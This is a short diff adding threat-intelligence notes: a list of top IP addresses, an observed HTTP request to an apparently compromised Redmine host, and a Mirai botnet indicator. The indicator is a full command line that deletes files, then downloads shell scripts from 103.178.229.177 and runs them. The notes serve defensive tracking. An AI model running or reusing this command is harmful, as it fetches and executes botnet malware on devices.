@@ -1,0 +1,22 @@
+Top 5 IPs for todays date
+
+164.132.200.213
+46.19.139.138
+206.189.114.179
+187.134.236.169
+188.149.185.45
+
+#malcious payload observed:
+
+Seems like hacked infra port 80 is hotsing redmine : 
+https://bitnami.com/stack/redmine
+
+GET / HTTP/1.1
+Host: 3.236.116.2:8017
+User-Agent: curl/7.64.1
+Accept: */*
+
+Fe more Mirai IOCs
+
+cd /data/local/tmp/; rm -rf *arm*; rm -rf *arm5*; rm -rf *arm6*; rm -rf *arm7*; rm -rf *m68k*; rm -rf *mips*; rm -rf *mpsl*; rm -rf *ppc*; rm -rf *sh4*; rm -rf *spc*; rm -rf *x86*; rm -rf *x86_64*;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
+
